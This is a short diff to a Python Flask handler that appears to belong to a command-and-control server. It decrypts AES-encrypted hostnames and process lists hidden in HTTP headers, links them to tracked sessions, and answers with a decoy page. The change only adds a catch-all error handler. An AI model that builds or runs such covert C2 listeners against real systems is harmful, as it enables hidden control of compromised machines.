@@ -215,20 +215,22 @@ def fr():
 
 @app.route(report_url)
 def report():
-    encrypted_host = request.headers["App-Logic"]
-    hostname = decrypt_command(aes_encryption_key, encrypted_host).strip("\x00")
-    for key in list(connections_information.keys()):
-        if hostname in connections_information[key][2]:
-            session = connections_information[key]
-            header = request.headers["Authorization"]
-            processes = decrypt_command(aes_encryption_key, header).strip("\x00").split(" ")
-            esa(processes, session)
-        else:
-            pass
-    response = make_response("Cool page !")
-    response.headers["Server"] = server_response_header
-    return response
-
+    try:
+        encrypted_host = request.headers["App-Logic"]
+        hostname = decrypt_command(aes_encryption_key, encrypted_host).strip("\x00")
+        for key in list(connections_information.keys()):
+            if hostname in connections_information[key][2]:
+                session = connections_information[key]
+                header = request.headers["Authorization"]
+                processes = decrypt_command(aes_encryption_key, header).strip("\x00").split(" ")
+                esa(processes, session)
+            else:
+                pass
+        response = make_response("Cool page !")
+        response.headers["Server"] = server_response_header
+        return response
+    except:
+        return ""
 
 
 
